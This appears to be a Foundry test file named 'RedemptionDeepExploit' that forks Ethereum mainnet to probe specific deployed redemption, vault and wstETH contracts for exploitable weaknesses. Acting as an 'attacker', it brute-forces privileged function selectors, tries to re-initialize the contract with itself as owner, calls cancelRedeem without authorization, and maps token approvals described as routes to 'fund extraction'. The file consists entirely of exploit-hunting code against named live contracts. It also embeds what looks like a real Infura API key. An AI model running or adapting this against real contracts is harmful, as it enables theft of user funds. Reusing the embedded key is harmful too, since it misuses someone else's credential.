// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IRedemption {
    function IAU() external view returns (address);
    function REDEMPTION_CONTROLLER() external view returns (address);
    function TASSET() external view returns (address);
    function VAULT() external view returns (address);
    function owner() external view returns (address);
    function paused() external view returns (bool);
    function redeem(uint96 amount) external;
    function finalizeRedeem(uint256 index) external;
    function cancelRedeem(uint256 index) external;
}

contract RedemptionDeepExploit is Test {
    address constant REDEMPTION_0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant REDEMPTION_1 = 0x829525417Cd78CBa0f99A8736426fC299506C0d6;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;

    // EIP-1967 slots
    bytes32 constant IMPL_SLOT = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_AnalyzeRedemption0Bytecode() public view {
        console.log("=== REDEMPTION 0 BYTECODE ANALYSIS ===\n");

        bytes memory code = REDEMPTION_0.code;
        console.log("Code size:", code.length);

        // Check if proxy
        bytes32 implSlot = vm.load(REDEMPTION_0, IMPL_SLOT);
        address impl = address(uint160(uint256(implSlot)));
        console.log("EIP-1967 impl:", impl);

        // Find all function selectors
        console.log("\nScanning for DELEGATECALL patterns...");

        uint256 delegatecallCount = 0;
        uint256 callCount = 0;
        uint256 staticcallCount = 0;

        for (uint i = 0; i < code.length; i++) {
            uint8 op = uint8(code[i]);
            if (op == 0xf4) delegatecallCount++;  // DELEGATECALL
            if (op == 0xf1) callCount++;          // CALL
            if (op == 0xfa) staticcallCount++;    // STATICCALL
        }

        console.log("DELEGATECALL opcodes:", delegatecallCount);
        console.log("CALL opcodes:", callCount);
        console.log("STATICCALL opcodes:", staticcallCount);
    }

    function test_TryAllFunctionSelectors() public {
        console.log("=== TRYING FUNCTION SELECTORS ON REDEMPTION ===\n");

        vm.startPrank(attacker);

        // Common dangerous selectors
        bytes4[] memory selectors = new bytes4[](20);
        selectors[0] = bytes4(keccak256("execute(address,bytes)"));
        selectors[1] = bytes4(keccak256("callExecute(address,bytes)"));
        selectors[2] = bytes4(keccak256("executeAction(bytes,uint8[],bytes32[])"));
        selectors[3] = bytes4(keccak256("executeActions(bytes[],uint8[][],bytes32[][])"));
        selectors[4] = bytes4(keccak256("upgradeToAndCall(address,bytes)"));
        selectors[5] = bytes4(keccak256("initialize(address)"));
        selectors[6] = bytes4(keccak256("initialize()"));
        selectors[7] = bytes4(keccak256("setOwner(address)"));
        selectors[8] = bytes4(keccak256("transferOwnership(address)"));
        selectors[9] = bytes4(keccak256("withdraw(uint256)"));
        selectors[10] = bytes4(keccak256("withdraw(address,uint256)"));
        selectors[11] = bytes4(keccak256("rescueERC20(address,address,uint256)"));
        selectors[12] = bytes4(keccak256("sweep(address,address)"));
        selectors[13] = bytes4(keccak256("claimRewards(address)"));
        selectors[14] = bytes4(keccak256("harvest()"));
        selectors[15] = bytes4(keccak256("multicall(bytes[])"));
        selectors[16] = bytes4(keccak256("delegatecall(address,bytes)"));
        selectors[17] = bytes4(keccak256("call(address,bytes)"));
        selectors[18] = bytes4(keccak256("executeOperation(address,uint256,uint256,address,bytes)"));
        selectors[19] = bytes4(keccak256("onFlashLoan(address,address,uint256,uint256,bytes)"));

        string[20] memory names = [
            "execute(address,bytes)",
            "callExecute(address,bytes)",
            "executeAction(bytes,uint8[],bytes32[])",
            "executeActions(bytes[],uint8[][],bytes32[][])",
            "upgradeToAndCall(address,bytes)",
            "initialize(address)",
            "initialize()",
            "setOwner(address)",
            "transferOwnership(address)",
            "withdraw(uint256)",
            "withdraw(address,uint256)",
            "rescueERC20(address,address,uint256)",
            "sweep(address,address)",
            "claimRewards(address)",
            "harvest()",
            "multicall(bytes[])",
            "delegatecall(address,bytes)",
            "call(address,bytes)",
            "executeOperation(address,uint256,uint256,address,bytes)",
            "onFlashLoan(address,address,uint256,uint256,bytes)"
        ];

        console.log("Testing Redemption 0:", REDEMPTION_0);

        for (uint i = 0; i < selectors.length; i++) {
            (bool success,) = REDEMPTION_0.staticcall(abi.encodePacked(selectors[i]));
            if (success) {
                console.log("  FOUND:", names[i]);
                console.logBytes4(selectors[i]);
            }
        }

        vm.stopPrank();
    }

    function test_ExploitViaInitialize() public {
        console.log("=== EXPLOIT VIA INITIALIZE ===\n");

        // Check if Redemption can be re-initialized
        vm.startPrank(attacker);

        // Try initialize with various signatures
        bytes4[] memory initSelectors = new bytes4[](6);
        initSelectors[0] = bytes4(keccak256("initialize()"));
        initSelectors[1] = bytes4(keccak256("initialize(address)"));
        initSelectors[2] = bytes4(keccak256("initialize(address,address)"));
        initSelectors[3] = bytes4(keccak256("initialize(address,address,address)"));
        initSelectors[4] = bytes4(keccak256("__Redemption_init()"));
        initSelectors[5] = bytes4(keccak256("__ReentrancyGuard_init()"));

        console.log("Trying to re-initialize Redemption 0...");

        for (uint i = 0; i < initSelectors.length; i++) {
            bytes memory callData;
            if (i == 0 || i == 4 || i == 5) {
                callData = abi.encodePacked(initSelectors[i]);
            } else if (i == 1) {
                callData = abi.encodeWithSelector(initSelectors[i], attacker);
            } else if (i == 2) {
                callData = abi.encodeWithSelector(initSelectors[i], attacker, attacker);
            } else {
                callData = abi.encodeWithSelector(initSelectors[i], attacker, attacker, attacker);
            }

            (bool success,) = REDEMPTION_0.call(callData);
            if (success) {
                console.log("  Initialize selector succeeded!");
                console.logBytes4(initSelectors[i]);
            }
        }

        vm.stopPrank();
    }

    function test_AnalyzeRedemptionStorage() public view {
        console.log("=== REDEMPTION STORAGE ANALYSIS ===\n");

        // Read first 20 storage slots
        console.log("Redemption 0 storage slots:");
        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(REDEMPTION_0, bytes32(i));
            if (slot != bytes32(0)) {
                console.log("  Slot", i, ":");
                console.logBytes32(slot);
            }
        }

        // Check OpenZeppelin Initializable slot (keccak256("eip1967.proxy.admin") - 1)
        bytes32 initSlot = bytes32(uint256(0));
        bytes32 initValue = vm.load(REDEMPTION_0, initSlot);
        console.log("\nSlot 0 (potentially _initialized):");
        console.logBytes32(initValue);
    }

    function test_CheckRedemptionDelegateTargets() public view {
        console.log("=== CHECKING REDEMPTION DELEGATE TARGETS ===\n");

        // The 8 DELEGATECALLs might be to OpenZeppelin upgradeable libraries
        // Let's check what contracts Redemption references

        IRedemption r = IRedemption(REDEMPTION_0);

        console.log("Known addresses:");
        console.log("  IAU:", r.IAU());
        console.log("  TASSET:", r.TASSET());
        console.log("  VAULT:", r.VAULT());
        console.log("  REDEMPTION_CONTROLLER:", r.REDEMPTION_CONTROLLER());
        console.log("  owner:", r.owner());

        // Check if any of these are the delegatecall targets
        address iau = r.IAU();
        address tasset = r.TASSET();

        console.log("\nAnalyzing IAU:", iau);
        console.log("  Code size:", iau.code.length);

        console.log("\nAnalyzing TASSET:", tasset);
        console.log("  Code size:", tasset.code.length);
    }

    function test_ExploitViaCancelRedeem() public {
        console.log("=== EXPLOIT VIA CANCEL REDEEM ===\n");

        // cancelRedeem might have weaker access control than finalizeRedeem
        vm.startPrank(attacker);

        console.log("Trying cancelRedeem(0) on Redemption 0...");
        try IRedemption(REDEMPTION_0).cancelRedeem(0) {
            console.log("CRITICAL: cancelRedeem succeeded!");
        } catch Error(string memory reason) {
            console.log("cancelRedeem failed:", reason);
        } catch (bytes memory data) {
            console.log("cancelRedeem failed (raw):");
            if (data.length >= 4 && data.length < 100) {
                console.logBytes(data);
            }
        }

        vm.stopPrank();
    }

    function test_AnalyzeAllApprovals() public view {
        console.log("=== ALL APPROVAL CHAINS ===\n");

        // Check all approval chains that could lead to fund extraction

        console.log("1. Vault approvals:");
        uint256 approval = IERC20(wstETH).allowance(VAULT, 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510);
        console.log("  Vault -> RedemptionController:", approval > 1e70 ? "MAX" : "Limited");

        approval = IERC20(wstETH).allowance(VAULT, REDEMPTION_0);
        console.log("  Vault -> Redemption 0:", approval);

        approval = IERC20(wstETH).allowance(VAULT, REDEMPTION_1);
        console.log("  Vault -> Redemption 1:", approval);

        console.log("\n2. Redemption approvals:");
        approval = IERC20(wstETH).allowance(REDEMPTION_0, VAULT);
        console.log("  Redemption 0 -> Vault:", approval);

        approval = IERC20(wstETH).allowance(REDEMPTION_0, 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510);
        console.log("  Redemption 0 -> RedemptionController:", approval);

        console.log("\n3. RedemptionController approvals:");
        address rc = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
        approval = IERC20(wstETH).allowance(rc, VAULT);
        console.log("  RedemptionController -> Vault:", approval);

        console.log("\n4. Token addresses:");
        console.log("  IAU:", IRedemption(REDEMPTION_0).IAU());
        console.log("  TASSET:", IRedemption(REDEMPTION_0).TASSET());
    }

    function test_FlashLoanCallback() public {
        console.log("=== FLASH LOAN CALLBACK ANALYSIS ===\n");

        // Check if Redemption or any related contract implements flash loan callbacks

        vm.startPrank(attacker);

        // Try Aave V3 callback
        bytes4 aaveCallback = bytes4(keccak256("executeOperation(address[],uint256[],uint256[],address,bytes)"));
        (bool success,) = REDEMPTION_0.call(abi.encodeWithSelector(
            aaveCallback,
            new address[](0),
            new uint256[](0),
            new uint256[](0),
            attacker,
            ""
        ));
        console.log("Aave executeOperation exists:", success);

        // Try Balancer callback
        bytes4 balancerCallback = bytes4(keccak256("receiveFlashLoan(address[],uint256[],uint256[],bytes)"));
        (success,) = REDEMPTION_0.call(abi.encodeWithSelector(
            balancerCallback,
            new address[](0),
            new uint256[](0),
            new uint256[](0),
            ""
        ));
        console.log("Balancer receiveFlashLoan exists:", success);

        // Try UniswapV3 callback
        bytes4 uniCallback = bytes4(keccak256("uniswapV3FlashCallback(uint256,uint256,bytes)"));
        (success,) = REDEMPTION_0.call(abi.encodeWithSelector(
            uniCallback,
            0,
            0,
            ""
        ));
        console.log("UniswapV3 flashCallback exists:", success);

        vm.stopPrank();
    }
}
